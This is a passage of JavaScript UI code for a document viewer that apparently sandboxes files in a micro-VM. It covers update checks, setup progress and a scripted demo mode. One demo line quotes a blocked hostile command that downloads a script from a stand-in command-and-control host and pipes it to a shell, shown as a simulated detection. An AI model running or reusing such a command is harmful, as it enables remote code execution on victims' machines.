$("textbtn").onclick = showText;
$("savebtn").onclick = (e) => { e.stopPropagation(); toggleSaveMenu(); };
$("safecopy").onclick = saveSafeCopy;
$("print").onclick = printDocument;
document.addEventListener("click", (e) => { if (!$("savewrap").contains(e.target)) toggleSaveMenu(false); });
$("m-pixels").onclick = () => { toggleAppMenu(false); setPixelsOnly(!state.pixelsOnly); };
$("panel-close").onclick = closePanel;
$("qnext").onclick = () => stepHit(1);
$("qprev").onclick = () => stepHit(-1);
$("banner-more").onclick = () => state.findings && renderReport(openPanel("Blocked while viewing"), state.findings);

let searchTimer = null;
$("q").addEventListener("input", () => {
  clearTimeout(searchTimer);
  searchTimer = setTimeout(runSearch, 300);
});
$("q").addEventListener("keydown", (e) => {
  if (e.key === "Enter") { e.preventDefault(); stepHit(e.shiftKey ? -1 : 1); }
  if (e.key === "Escape") { $("q").value = ""; runSearch(); $("q").blur(); }
});

document.addEventListener("keydown", (e) => {
  const mod = e.ctrlKey || e.metaKey;
  if (mod && e.key.toLowerCase() === "o") { e.preventDefault(); openDialog(); return; }
  if (!state.docOpen) return;
  if (mod && e.key.toLowerCase() === "f") { e.preventDefault(); $("q").focus(); $("q").select(); return; }
  if (mod && e.key.toLowerCase() === "s") { e.preventDefault(); saveSafeCopy(); return; }
  if (mod && e.key.toLowerCase() === "p") { e.preventDefault(); printDocument(); return; }
  if (e.target.tagName === "INPUT") return;
  if (e.key === "+" || e.key === "=") stepZoom(1);
  else if (e.key === "-") stepZoom(-1);
  else if (e.key === "Escape") { toggleSaveMenu(false); closePanel(); }
});

let resizeTimer = null;
window.addEventListener("resize", () => {
  clearTimeout(resizeTimer);
  resizeTimer = setTimeout(() => state.docOpen && (state.fitMode ? fitWidth() : layout()), 150);
});

// Drag & drop: Tauri hands us the *path*; the bytes are read by Rust only.
window.__TAURI__.webview.getCurrentWebview().onDragDropEvent((event) => {
  const t = event.payload.type;
  $("viewer").classList.toggle("drop", t === "over" || t === "enter");
  if (t === "drop" && event.payload.paths.length) openPaths(event.payload.paths);
});

// ---------------------------------------------------------------- updates
// The VM's renderers, kernel and Firecracker are rebuilt from the source
// checkout by scripts/update.sh (verified downloads, regression suite,
// automatic restore on failure). Checked at most once a day.

const updates = { status: null, running: false, log: [], restart: false };

function pref(key, fallback) {
  try { return localStorage.getItem(key) ?? fallback; } catch { return fallback; }
}
function setPref(key, value) {
  try { localStorage.setItem(key, value); } catch {}
}

function describeChanges(st, max) {
  const list = st.changes.slice(0, max);
  const more = st.changes.length - list.length + Math.max(0, st.packages - st.changes.filter((c) => !/^(Guest kernel|Firecracker|Alpine base) /.test(c)).length);
  return { list, more };
}

function noteStatus(st) {
  updates.status = st;
  // A dot on the airlock logo and on the menu item; no toolbar button.
  $("updates-dot").hidden = !(st && st.available);
  $("m-updates-dot").hidden = !(st && st.available);
}

async function checkUpdates(force) {
  const st = await invoke("update_status", { force });
  noteStatus(st);
  return st;
}

// A small notice in the corner: title, text, [label, action] buttons.
function notify(title, text, actions) {
  $("toast-title").textContent = title;
  $("toast-text").textContent = text;
  $("toast-actions").replaceChildren(...actions.map(([label, fn], i) => {
    const b = el("button", i === 0 && actions.length > 1 ? "primary" : "", label);
    b.onclick = fn;
    return b;
  }));
  $("toast").hidden = false;
}

function changeSummary(st) {
  const { list, more } = describeChanges(st, 2);
  return list.join(", ") + (more > 0 ? ` and ${more} more` : "");
}

function showToast(st) {
  notify("Security updates for airlock", `${changeSummary(st)}. Installing them takes about two minutes; you can keep reading.`, [
    ["Update now", () => runUpdate()],
    ["Details", showUpdates],
    ["Later", () => { hideToast(); setPref("airlock.updateSnooze", String(Date.now() + 86_400_000)); }],
  ]);
}

function hideToast() { $("toast").hidden = true; }

function renderUpdates(body) {
  const st = updates.status;
  const nodes = [];
  if (!st || !st.supported) {
    nodes.push(el("p", "", "This copy of airlock has no update kit."),
      el("p", "note", "Install it with scripts/install.sh (which adds the kit), or set AIRLOCK_SOURCE to an airlock source folder."));
    body.replaceChildren(...nodes);
    return;
  }
  if (st.error) nodes.push(el("p", "note", `Last check failed: ${st.error}`));
  else if (st.available) {
    nodes.push(el("p", "", "Security updates are available:"));
    const ul = el("ul", "changes");
    for (const c of st.changes) ul.append(el("li", "", c));
    if (st.packages > st.changes.length) ul.append(el("li", "", `… ${st.packages} packages in total`));
    nodes.push(ul);
  } else nodes.push(el("p", "", "Everything is up to date."));
  const when = st.checked ? new Date(st.checked * 1000).toLocaleString() : "never";
  nodes.push(el("p", "note", `Last checked: ${when} · VM image built ${st.image_age_days} day(s) ago.`));

  const row = el("div", "row");
  const check = el("button", "", "Check now");
  const go = el("button", "primary", updates.running ? "Updating…" : "Update now");
  go.disabled = updates.running;
  check.disabled = updates.running;
  check.onclick = async () => {
    check.disabled = true; check.textContent = "Checking…";
    try { await checkUpdates(true); } catch (e) { status(`Update check failed: ${e}`, true); }
    renderUpdates(body);
  };
  go.onclick = () => runUpdate(body);
  row.append(go, check);
  nodes.push(row, el("p", "note", "Downloads are verified (kernel.org signatures, published checksums). The full test suite must pass before the new version is used; otherwise the current one stays."));

  const toggle = (key, text, onChange) => {
    const label = el("label", "check");
    const box = el("input");
    box.type = "checkbox";
    box.checked = pref(key, "1") === "1";
    box.onchange = () => { setPref(key, box.checked ? "1" : "0"); onChange?.(box.checked); };
    label.append(box, document.createTextNode(text));
    return [label, box];
  };
  const [checkLabel] = toggle("airlock.autoUpdateCheck", "Check for updates automatically (once a day: kernel.org, GitHub, Alpine)", () => renderUpdates(body));
  const [installLabel, installBox] = toggle("airlock.autoInstall", "Install security updates automatically (in the background; you are told afterwards)");
  installBox.disabled = pref("airlock.autoUpdateCheck", "1") !== "1";
  nodes.push(checkLabel, installLabel);

  if (updates.forge) {
    $("forge").hidden = false;
    nodes.push($("forge"));
  }
  if (updates.log.length) {
    const ul = el("ul", "progress");
    for (const l of updates.log) ul.append(el("li", "", l));
    nodes.push(ul);
  }
  if (updates.restart) {
    const r = el("button", "primary", "Restart airlock");
    r.onclick = () => invoke("restart_app");
    nodes.push(el("p", "", "airlock itself was updated too. Documents opened from now on already use the new VM; restart to use the new app."), r);
  }
  body.replaceChildren(...nodes);
  // Moving the console into the panel resets its scroll: back to the end.
  if (updates.forge) $("setup-log").scrollTop = $("setup-log").scrollHeight;
}

function showUpdates() {
  hideToast();
  renderUpdates(openPanel("Updates"));
}

// quiet: started automatically — no panel, a notice when done.
async function runUpdate(body, quiet = false) {
  if (updates.running) return;
  hideToast();
  if (!updates.status) await checkUpdates(false).catch(() => {});
  updates.running = true;
  updates.restart = false;
  updates.log = [];
  forge.reset("update");
  updates.forge = true;
  const tick = setInterval(() => forge.render(), 500);
  if (!quiet) {
    if (!body || $("panel-title").textContent !== "Updates") body = openPanel("Updates");
    renderUpdates(body);
  }
  status("Updating airlock's VM in the background…");
  let ok = false;
  try {
    const r = await invoke("run_update");
    // The script's summary minus its command-line hints.
    for (const l of r.lines) {
      const t = l.trim();
      if (t && !t.startsWith("==>") && !t.startsWith("undo:")) updates.log.push(t);
    }
    forge.finish(r.ok, "The new version failed its checks; the current one is still in place.");
    updates.restart = r.ok && r.restart;
    ok = r.ok;
    status(r.ok ? "airlock updated" : "Update failed — nothing was changed", !r.ok);
    try { await checkUpdates(true); } catch {}
  } catch (e) {
    forge.finish(false, `Update failed: ${e}`);
    status(`Update failed: ${e}`, true);
  } finally {
    clearInterval(tick);
    updates.running = false;
    if ($("panel-title").textContent === "Updates" && !$("panel").hidden) renderUpdates($("panel-body"));
  }
  if (quiet) {
    if (ok) notify("airlock was updated", "Security updates were installed and all checks passed. Documents you open now use the updated VM.", [
      ...(updates.restart ? [["Restart airlock", () => invoke("restart_app")]] : []),
      ["Details", showUpdates], ["OK", hideToast]]);
    else notify("Automatic update failed", "Nothing was changed: airlock keeps using the current version. Details are in the Updates panel.", [["Details", showUpdates], ["OK", hideToast]]);
  }
}

// Every line goes to the progress console, also while the panel is closed
// (an automatic update can be watched by opening Updates).
window.__TAURI__.event.listen("update-progress", (e) => { if (updates.forge) forge.line(String(e.payload)); });

$("m-updates").onclick = () => { toggleAppMenu(false); showUpdates(); };

async function autoCheckUpdates() {
  if (pref("airlock.autoUpdateCheck", "1") !== "1") return;
  // Test runs (a demo script drives the app) never start updates.
  if (await invoke("demo_script").catch(() => null)) return;
  try {
    const st = await checkUpdates(false);
    if (!st.available) return;
    if (pref("airlock.autoInstall", "1") === "1") {
      // Ask again right before installing: another window, or an update in
      // the meantime, may already have brought everything up to date.
      const fresh = await checkUpdates(true);
      if (!fresh.available) return;
      notify("Installing security updates", `${changeSummary(st)}. airlock is updating in the background; you can keep reading.`, [["Details", showUpdates], ["Hide", hideToast]]);
      runUpdate(null, true);
    } else if (Date.now() > Number(pref("airlock.updateSnooze", "0"))) showToast(st);
  } catch {}
}
setTimeout(autoCheckUpdates, 3000);

async function runDemo() {
  const script = await invoke("demo_script");
  if (!script) return;
  for (const step of script.split(";")) {
    const [cmd, arg] = step.split("=");
    if (cmd === "search") { $("q").value = arg; await runSearch(); }
    if (cmd === "open") openPaths([arg]);
    if (cmd === "reopen") await reopenDocument();
    if (cmd === "appmenu") toggleAppMenu(true);
    if (cmd === "ctx") {
      const [x, y] = arg.split(",").map(Number);
      document.elementFromPoint(x, y).dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
    }
    if (cmd === "click") $(arg).click();
    if (cmd === "tripwire") vmStopped("the document attacked its VM: /bin/sh [/bin/sh -c curl http://c2.example/x | sh] (blocked; the VM was destroyed at once)");
    if (cmd === "sheets") { setPref("airlock.sheetSingle", arg === "single" ? "1" : "0"); showSheetLayout(); await invoke("set_sheet_layout", { single: arg === "single" }); await reopenDocument(); }
    if (cmd === "tour") { startTour(); tourShow(Number(arg) || 0); }
    if (cmd === "wait") await new Promise((r) => setTimeout(r, Number(arg) || 0));
    if (cmd === "scroll") $("viewer").scrollTop = Number(arg) || 0;
    if (cmd === "tscroll") $("panel-body").scrollTop = Number(arg) || 0;
    if (cmd === "settings") await showSettings();
    if (cmd === "palette") { openPalette(); $("pal-q").value = arg || ""; renderPalette(); }
    if (cmd === "thumbs") setThumbs(true);
    if (cmd === "peek") showPeek();
    if (cmd === "czoom") { const b = $("viewer").getBoundingClientRect(); $("viewer").dispatchEvent(new WheelEvent("wheel", { deltaY: Number(arg), ctrlKey: true, clientX: b.left + b.width / 2, clientY: b.top + 200, bubbles: true, cancelable: true })); }
    if (cmd === "theme") { setPref("airlock.theme", arg); applyTheme(); }
    if (cmd === "background") { setPref("airlock.background", arg); applyTheme(); }
    if (cmd === "panelw") { setPref("airlock.panelWidth", arg); applyPanelWidth(); if (state.fitMode) fitWidth(); }
    if (cmd === "text") await showText();
    if (cmd === "aitext") { setPref("airlock.aiHints", "1"); await showText(); await new Promise((r) => setTimeout(r, Number(arg) || 3000)); }
    if (cmd === "reveal") {
      // Paint the invisible text layer red to check its alignment.
      await new Promise((r) => setTimeout(r, 1500));
      for (const span of document.querySelectorAll(".page .text span")) span.style.color = "rgba(220, 0, 0, 0.75)";
    }
    if (cmd === "select") {
      // Select page 1's text layer and show what a copy would contain.
      await new Promise((r) => setTimeout(r, 1500));
      const r = document.createRange();
      r.selectNodeContents(state.pages[0].text);
      getSelection().removeAllRanges();
      getSelection().addRange(r);
      const body = openPanel("Selection (demo)");
      body.replaceChildren(el("pre", "", JSON.stringify(getSelection().toString()).slice(0, 2000)));
    }
    if (cmd === "analyze") await analyze();
    if (cmd === "savemenu") toggleSaveMenu(true);
    if (cmd === "print") await printDocument();
    if (cmd === "safecopy") await saveSafeCopy();
    if (cmd === "savereport") await saveReport();
    if (cmd === "update") await runUpdate();
    if (cmd === "restart") { await new Promise((r) => setTimeout(r, Number(arg) || 0)); await invoke("restart_app"); }
    if (cmd === "updates") { await checkUpdates(arg === "force"); showUpdates(); }
    if (cmd === "autotoast") notify("airlock was updated", "Security updates were installed and all checks passed. Documents you open now use the updated VM.", [["Restart airlock", () => {}], ["Details", showUpdates], ["OK", hideToast]]);
    if (cmd === "toast") showToast({ changes: ["mupdf-tools 1.27.2-r0 → 1.27.3-r0", "Guest kernel 6.1.190 → 6.1.191"], packages: 14 });
  }
}

// Pixels-only preference: the environment (AIRLOCK_PIXELS_ONLY) or the last choice.
// Spreadsheet layout: "One page" per sheet, or pages fitted to the width.
// Converting happens in the VM, so switching reopens the document there.
function sheetSingle() { return pref("airlock.sheetSingle", "0") === "1"; }
function showSheetLayout() {
  const on = sheetSingle();
  $("sheetbtn").setAttribute("aria-pressed", String(on));
  $("sheetbtn").title = on
    ? "Showing each sheet as one continuous page. Click to split sheets into pages that fit the width."
    : "Showing sheets split into pages that fit the width. Click to show each sheet as one continuous page (very large sheets stay split, to remain sharp).";
}
$("sheetbtn").onclick = async () => {
  setPref("airlock.sheetSingle", sheetSingle() ? "0" : "1");
  showSheetLayout();
  await invoke("set_sheet_layout", { single: sheetSingle() });
  await reopenDocument();
};
const sheetsReady = invoke("set_sheet_layout", { single: sheetSingle() }).then(showSheetLayout);

const pixelsReady = invoke("pixels_only").then(async (on) => {
  let saved = null;
  try { saved = localStorage.getItem("airlock.pixelsOnly"); } catch {}
  // Only the user's own toggling is remembered, not the environment's default.
  await setPixelsOnly(on || saved === "1", false);
  status("Ready");
});

// ---------------------------------------------------------------- first-run setup
// Shown instead of the start page when this computer still needs something
// (scripts/setup.sh check). On a ready computer it never appears.
const setup = { items: [] };
async function checkSetup() {
  let items = [];
  try { items = await invoke("setup_check"); } catch (e) { status(`Could not check this computer: ${e}`, true); }
  setup.items = items;
  const pending = items.filter((i) => i.status !== "ok");
  $("setup").hidden = !pending.length;
  if (!state.docOpen) $("empty").hidden = !!pending.length;
  if (!pending.length) return true;
  const marks = { ok: "✓", fix: "!", build: "↓", fail: "✕" };
  $("setup-list").replaceChildren(...items.map((i) => {
    const li = el("li", i.status);
    li.append(el("span", "mark", marks[i.status] || "?"), el("span", "", i.text));
    return li;
  }));
  const fixable = items.some((i) => i.status === "fix");
  $("setup-fix").hidden = !fixable;
  $("setup-build").hidden = fixable || !items.some((i) => i.status === "build") || items.some((i) => i.status === "fail");
  return false;
}
$("setup-recheck").onclick = checkSetup;
$("setup-fix").onclick = async () => {
  const b = $("setup-fix");
  b.disabled = true;
  status("Waiting for your password…");
  try { await invoke("setup_fix"); status("System settings done"); }
  catch (e) { status(String(e), true); }
  b.disabled = false;
  checkSetup();
};
// ---- setup progress view: the build's output turned into stages, one real
// progress bar and a plain-words line about what is happening right now.
// Each step has an expected duration (seconds, measured on a mid-range PC);
// steps with a counter (downloads, packages, kernel files, crates) move by
// it, the others creep towards their end. The ETA scales the remaining
// expected time by how fast this computer has been so far.
// Setup builds the VM once; an update also checks upstream versions first
// and must pass the regression suite ("Tests") before the new VM is used.
const forgeStages = (mode) => [
  ["check", "Check"], ["fetch", "Download"], ["kernel", "Kernel"], ["programs", "Programs"],
  ["rules", "Signatures"], ["seal", "Seal image"], ...(mode === "update" ? [["tests", "Tests"]] : []), ["install", "Install"],
];
const FORGE_STEPS = {
  "check/upstream": { stage: "check", t: 12, what: "Checking for newer versions", why: "kernel.org, Firecracker's releases, Alpine and YARA-Forge; every download is verified against signed or published checksums." },
  check: { stage: "check", t: 1, what: "Checking this computer", why: "Virtualisation, sandboxing and the tools the build needs." },
  fetch: { stage: "fetch", t: 15, what: "Downloading", why: "Pinned versions from the official sources; every file's fingerprint is checked." },
  "kernel/unpack": { stage: "kernel", t: 10, what: "Unpacking the Linux kernel source", why: "The VM gets its own small kernel, built here with risky features switched off." },
  "kernel/tools": { stage: "kernel", t: 20, what: "Getting the compiler tools", why: "Used only to build; they never end up inside the viewer." },
  "kernel/compile": { stage: "kernel", t: 140, what: "Compiling the locked-down kernel", why: "Firecracker's minimal settings plus airlock's hardening: no modules, no debugging hooks, no unneeded drivers." },
  "programs/tools": { stage: "programs", t: 8, what: "Getting the Rust compiler", why: "To build the airlock agent from source." },
  "programs/agent": { stage: "programs", t: 8, what: "Building the airlock agent", why: "The tiny program inside the VM that renders pages and reports what the file tries to do." },
  "programs/base": { stage: "programs", t: 2, what: "Applying security updates", why: "The viewer's base system starts fully patched." },
  "programs/packages": { stage: "programs", t: 25, what: "Installing the document readers", why: "LibreOffice, MuPDF and the inspectors: they only ever run inside the VM, never on your computer." },
  "rules/rules": { stage: "rules", t: 5, what: "Compiling the malware signatures", why: "YARA-Forge's tested rule set: thousands of documented malware patterns, checked against every file." },
  "seal/fonts": { stage: "seal", t: 1, what: "Preparing fonts", why: "So documents look the way their author meant." },
  "seal/office": { stage: "seal", t: 4, what: "Preparing LibreOffice", why: "A clean, prebuilt profile: documents never get to change it." },
  "seal/pack": { stage: "seal", t: 4, what: "Packing the viewer", why: "Every file owned by the VM's root, nothing left over from the build." },
  "seal/image": { stage: "seal", t: 3, what: "Writing the read-only disk image", why: "Each document gets a fresh copy of it; nothing is ever saved back." },
  "tests/tests": { stage: "tests", t: 150, what: "Testing the new viewer", why: "airlock's full test suite: real exploit samples must be caught, ordinary documents must stay clean, escape attempts must kill the VM. If anything fails, the current version stays." },
  "install/install": { stage: "install", t: 2, what: "Installing the secure viewer", why: "Into your own folder; nothing outside it is changed." },
};
// Expected counts for the counted steps (cap the bar below 100% until the step ends).
const KERNEL_FILES = 2200, AGENT_CRATES = 12, DL_MB = 145, TEST_CHECKS = 27;
const DOWNLOADS = [
  [/^firecracker/, "Firecracker", "the micro-VM engine AWS built for Lambda: each document gets its own tiny computer"],
  [/^alpine-minirootfs/, "Alpine Linux", "the minimal base system inside the viewer"],
  [/^yara-forge/, "YARA-Forge malware signatures", "thousands of documented malware patterns"],
  [/^linux-/, "the Linux kernel source", "compiled here into the VM's own locked-down kernel"],
  [/microvm.*config/, "Firecracker's kernel settings", "the minimal starting point for the VM's kernel"],
];
const KERNEL_DIRS = {
  arch: "processor support", kernel: "core kernel", mm: "memory management", fs: "file systems", net: "networking",
  drivers: "device drivers", security: "security modules", crypto: "cryptography", block: "disk access",
  lib: "kernel library", init: "start-up", ipc: "process communication", virt: "virtualisation", io_uring: "fast disk input/output",
};
function packageNote(name) {
  const rules = [
    [/^libreoffice-writer/, "LibreOffice Writer: opens Word and text documents"],
    [/^libreoffice-calc/, "LibreOffice Calc: opens spreadsheets"],
    [/^libreoffice-impress/, "LibreOffice Impress: opens presentations"],
    [/^libreoffice/, "LibreOffice core"],
    [/^mupdf/, "MuPDF: draws PDF pages"],
    [/^quickjs/, "QuickJS: runs airlock's PDF inspector"],
    [/^py3-oletools/, "oletools: finds macros and exploits in Office files"],
    [/^py3-/, "Python library for the inspectors"],
    [/^python3/, "Python: runs the Office inspector"],
    [/^yara/, "YARA: matches known malware patterns"],
    [/^zbar/, "ZBar: reads QR codes on pages"],
    [/^imagemagick/, "ImageMagick: prepares pages for the QR reader"],
    [/^font-|^fontconfig|^freetype|^harfbuzz/, "fonts and text shaping"],
    [/^icu|^hunspell|^hyphen/, "language and text support"],
    [/^cairo|^pango|^pixman|^libpng|^libjpeg|^tiff|^libwebp|^openjpeg|^lcms/, "graphics drawing"],
    [/^gcc|^musl-dev|^binutils|^make$|^build-base|^bc$|^flex|^bison|^perl|^openssl-dev|^elfutils-dev|^linux-headers|^g\+\+|^libc-dev|^fortify|^patch$/, "compiler tools (build only)"],
    [/^cargo|^rust/, "Rust compiler (build only)"],
    [/^musl$|^busybox|^alpine-|^apk-tools/, "base system"],
    [/^openssl|^libssl|^libcrypto|^ca-certificates/, "encryption library"],
  ];
  for (const [re, note] of rules) if (re.test(name)) return note;
  return "supporting library";
}
const fmtTime = (s) => { s = Math.max(0, Math.round(s)); return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, "0")}`; };
const fmtLeft = (s) => (s < 50 ? "under a minute left" : s < 90 ? "about a minute left" : `about ${Math.round(s / 60)} min left`);
const curlSize = (v) => { const m = /^([\d.]+)([kMG]?)$/.exec(v); if (!m) return null; return +m[1] * ({ "": 1 / 1048576, k: 1 / 1024, M: 1, G: 1024 }[m[2]]); };
const mb = (v) => (v >= 100 ? v.toFixed(0) : v >= 10 ? v.toFixed(1) : v.toFixed(2)) + " MB";

const forge = {
  reset(mode = "setup") {
    const update = mode === "update";
    Object.assign(this, { mode, t0: Date.now(), step: update ? "check/upstream" : "check", stepT0: Date.now(), done: new Set(),
      skipped: new Set(update ? [] : ["check/upstream", "tests/tests"]), count: 0, total: 0,
      dl: { mb: 0, cur: 0 }, sub: null, live: null, lines: 0, finished: null, tEnd: 0, frac: 0 });
    $("forge").querySelector(".forge-note").innerHTML = update
      ? "<strong>Why does this take a while?</strong> The new viewer is built on your computer from verified sources and must pass the full test suite before it replaces the current one. You can keep reading documents meanwhile."
      : "<strong>Why does this take a while?</strong> airlock builds its viewer on your own computer from official, fingerprint-checked sources, instead of shipping a ready-made black box. It happens once; after that every document opens in a second.";
    $("forge-stages").replaceChildren(...forgeStages(mode).map(([id, label], i) => {
      const li = el("li", "", label);
      li.dataset.stage = id;
      li.dataset.n = String(i + 1).padStart(2, "0");
      return li;
    }));
    $("setup-log").replaceChildren();
    $("forge").classList.remove("ok", "bad");
    $("forge-title").textContent = update ? "Updating the secure viewer" : "Building the secure viewer";
    this.render();
  },
  enter(step) {
    if (!FORGE_STEPS[step] || step === this.step) return;
    // Everything before the new step is done.
    const order = Object.keys(FORGE_STEPS);
    for (const k of order.slice(0, order.indexOf(step))) if (!this.skipped.has(k)) this.done.add(k);
    Object.assign(this, { step, stepT0: Date.now(), count: 0, total: 0, sub: null });
  },
  stepFrac() {
    const st = FORGE_STEPS[this.step], el_ = (Date.now() - this.stepT0) / 1000;
    const creep = 1 - Math.exp(-el_ / st.t);
    if (this.step === "fetch") return Math.min(0.99, (this.dl.mb + this.dl.cur) / DL_MB) || creep * 0.3;
    if (this.step === "kernel/compile") return Math.min(0.99, this.count / KERNEL_FILES);
    if (this.step === "programs/agent" && this.count) return Math.min(0.97, this.count / AGENT_CRATES);
    if (this.total) return Math.min(0.99, this.count / this.total);
    return Math.min(0.95, creep);
  },
  // Expected seconds done and in total, over the steps not skipped.
  progress() {
    let all = 0, done = 0;
    for (const [k, st] of Object.entries(FORGE_STEPS)) {
      if (this.skipped.has(k)) continue;
      all += st.t;
      if (this.done.has(k)) done += st.t;
      else if (k === this.step) done += st.t * this.stepFrac();
    }
    return { all, done };
  },
  line(raw) {
    const line = raw.replace(/\s+$/, "");
    let m;
    if ((m = /^==> (.*)/.exec(line))) {
      const t = m[1];
      if (/^(Checking upstream|Verifying kernel|Firecracker v|Alpine \d|Keeping the current)/.test(t)) {
        if (this.step === "check/upstream") this.sub = t;
      } else if (/^Rebuilding and running|^Done$/.test(t)) {
        // update.sh / bootstrap.sh bookkeeping
      } else if (/^Fetching test fixtures/.test(t)) this.enter("tests/tests");
      else if (/^Updated/.test(t)) this.enter("install/install");
      else if (/^Checking host/.test(t)) this.enter("check");
      else if (/^Fetching pinned/.test(t)) this.enter("fetch");
      else if (/kernel .* is already built/.test(t)) {
        for (const k of ["kernel/unpack", "kernel/tools", "kernel/compile"]) this.skipped.add(k);
        $("forge-stages").querySelector('[data-stage="kernel"]').classList.add("skip");
      } else if (/^Building the hardened guest kernel/.test(t)) this.enter("kernel/unpack");
      else if (/^Building the guest image/.test(t)) this.enter("programs/tools");
      else if (/^Installing the secure viewer/.test(t)) this.enter("install/install");
      if (t !== "Done") this.print(t, "step");
    } else if ((m = /^@@sub (\w+)/.exec(line))) {
      const id = m[1];
      const key = Object.keys(FORGE_STEPS).find((k) => k.endsWith("/" + id) && FORGE_STEPS[k].stage === this.stageOfNext(id));
      if (key) this.enter(key);
    } else if ((m = /^@@kernel (\d+) (\S+)/.exec(line))) {
      this.enter("kernel/compile");
      this.count = +m[1];
      this.sub = `${this.count.toLocaleString()} files compiled · now: ${KERNEL_DIRS[m[2]] || m[2]}`;
      this.print(`  CC  ${m[2]}/…  ${this.count.toLocaleString()} files`, "live", "kernel");
    } else if ((m = /^@@rules (\d+) (\d+)/.exec(line))) {
      this.sub = `${(+m[1]).toLocaleString()} signatures`;
      this.print(`  ${(+m[1]).toLocaleString()} malware signatures loaded`, "ok");
    } else if (/^@@/.test(line)) {
      // other markers (setup.sh's own @@ok line) are not shown
    } else if ((m = /^\s*fetching (\S+)/.exec(line))) {
      const d = DOWNLOADS.find(([re]) => re.test(m[1]));
      this.dl.file = m[1];
      this.dl.what = d ? `Downloading ${d[1]}` : `Downloading ${m[1]}`;
      this.dl.why = d ? d[2][0].toUpperCase() + d[2].slice(1) + "." : "";
      this.dl.cur = 0;
      this.sub = null;
      this.print(`  ↓ ${m[1]}`, "dl");
    } else if ((m = /^\s*verified (\S+)/.exec(line))) {
      this.dl.mb += this.dl.cur;
      this.dl.cur = 0;
      this.dl.what = `Checking ${m[1]}`;
      this.print(`  ✓ ${m[1]}: fingerprint matches the pinned SHA-256`, "ok");
    } else if ((m = /^\s*have (\S+)/.exec(line))) {
      this.print(`  ✓ ${m[1]} already downloaded and verified`, "ok");
    } else if (/^\s*\d+\s+[\d.]+[kMG]?\s+\d+\s+[\d.]+[kMG]?\s+\d+\s/.test(line)) {
      // curl's meter: % Total % Received % Xferd AvgDload AvgUpload [Total Spent Left] Speed
      const f = line.trim().split(/\s+/);
      const total = curlSize(f[1]), got = curlSize(f[3]), speed = curlSize(f[f.length - 1]);
      if (got != null) this.dl.cur = got;
      const left = f.length === 12 && /^[\d:]+$/.test(f[10]) ? f[10].split(":").reduce((a, b) => a * 60 + +b, 0) : null;
      this.dl.frac = total ? got / total : 0;
      if (total) {
        this.sub = `${mb(got || 0)} of ${mb(total)}${speed ? ` · ${mb(speed)}/s` : ""}${left != null && got < total ? ` · ${left} s left` : ""}`;
        this.print(`  ${f[0].padStart(3)}%  ${mb(got || 0)} / ${mb(total)}  ${speed ? mb(speed) + "/s" : ""}`, "live", "meter");
      }
    } else if ((m = /^\(\s*(\d+)\/(\d+)\) (Installing|Upgrading) (\S+)(?: \(([^)]*)\))?/.exec(line))) {
      this.count = +m[1];
      this.total = +m[2];
      this.sub = `${m[1]} of ${m[2]} · ${m[4]}: ${packageNote(m[4])}`;
      this.print(`  [${m[1].padStart(m[2].length)}/${m[2]}] ${m[3] === "Upgrading" ? "upgrade" : "install"} ${m[4]} ${m[5] || ""}`, "pkg");
    } else if ((m = /^\s*Compiling (\S+) (v\S+)/.exec(line))) {
      if (this.step !== "programs/agent") this.enter("programs/agent");
      this.count++;
      this.sub = `${this.count} components compiled · now: ${m[1]}`;
      this.print(`  compile ${m[1]} ${m[2]}`, "pkg");
    } else if (/^\s*#+\s+[\d.]+%$|^\s*% Total|^\s*Dload\s+Upload/.test(line)) {
      // a plain curl progress bar (terminal runs): skipped
    } else if ((m = /^(ok|FAIL)\s+(.*)/.exec(line)) && this.step === "tests/tests") {
      this.count++;
      this.total = Math.max(TEST_CHECKS, this.count + 1);
      this.sub = `${this.count} of ${TEST_CHECKS} checks · ${m[2].replace(/\s*\(.*$/, "")}`;
      this.print(`  ${m[1] === "ok" ? "✓" : "✕"} ${m[2]}`, m[1] === "ok" ? "ok" : "err");
    } else if (/^WARNING|^\s*\* /.test(line)) {
      this.print(line, "dim");
    } else if (/error|fail|mismatch|denied|not found/i.test(line)) {
      this.print(line, "err");
    } else {
      this.print(line, /^\s*(OK:|Executing|Finished|built )/.test(line) ? "dim" : "");
    }
    this.render();
  },
  stageOfNext(id) {
    // "tools" is used by both the kernel and the image stage: the next one.
    const cur = FORGE_STEPS[this.step].stage;
    if (id === "tools") return this.step === "kernel/unpack" || ["check", "fetch"].includes(cur) ? "kernel" : "programs";
    const key = Object.keys(FORGE_STEPS).find((k) => k.endsWith("/" + id));
    return key && FORGE_STEPS[key].stage;
  },
  print(text, cls, liveKind) {
    const screen = $("setup-log");
    if (liveKind && this.live && this.live.kind === liveKind && this.live.node.isConnected) {
      this.live.node.textContent = text;
    } else {
      const div = el("div", "ln " + (cls || ""), text);
      screen.append(div);
      this.lines++;
      this.live = liveKind ? { kind: liveKind, node: div } : null;
      while (screen.childElementCount > 400) screen.firstElementChild.remove();
    }
    const nearEnd = screen.scrollHeight - screen.scrollTop - screen.clientHeight < 60;
    if (nearEnd) screen.scrollTop = screen.scrollHeight;
  },
  render() {
    const elapsed = ((this.tEnd || Date.now()) - this.t0) / 1000;
    const { all, done } = this.progress();
    // Never move backwards (a skipped step can shrink the total).
    this.frac = this.finished === null ? Math.max(this.frac, Math.min(0.995, done / all)) : this.frac;
    const pct = Math.floor(this.frac * 100);
    $("forge-fill").style.width = `${this.frac * 100}%`;
    $("forge-pct").textContent = `${pct}%`;
    $("forge-bar").setAttribute("aria-valuenow", pct);
    $("forge-elapsed").textContent = fmtTime(elapsed);
    let eta = "";
    if (this.finished === null && elapsed > 8 && done > 2) eta = ` · ${fmtLeft((all - done) * (elapsed / done))}`;
    $("forge-eta").textContent = eta;
    const st = FORGE_STEPS[this.step];
    const isDl = this.step === "fetch" && this.dl.what;
    if (this.finished === null) {
      $("forge-what").textContent = isDl ? this.dl.what : st.what;
      $("forge-why").textContent = isDl ? this.dl.why : st.why;
    }
    const sf = this.step === "fetch" ? this.dl.frac || 0 : this.stepFrac();
    $("forge-subrow").hidden = !this.sub || this.finished !== null;
    $("forge-meter").textContent = this.sub || "";
    $("forge-subfill").style.width = `${Math.round(sf * 100)}%`;
    const cur = st.stage;
    let reached = true;
    for (const li of $("forge-stages").children) {
      const id = li.dataset.stage;
      const stageDone = this.finished === "ok" || reached && id !== cur;
      li.classList.toggle("done", stageDone && !li.classList.contains("skip"));
      li.classList.toggle("now", id === cur && this.finished === null);
      if (id === cur) reached = false;
    }
    $("forge-lines").textContent = `${this.lines} lines`;
  },
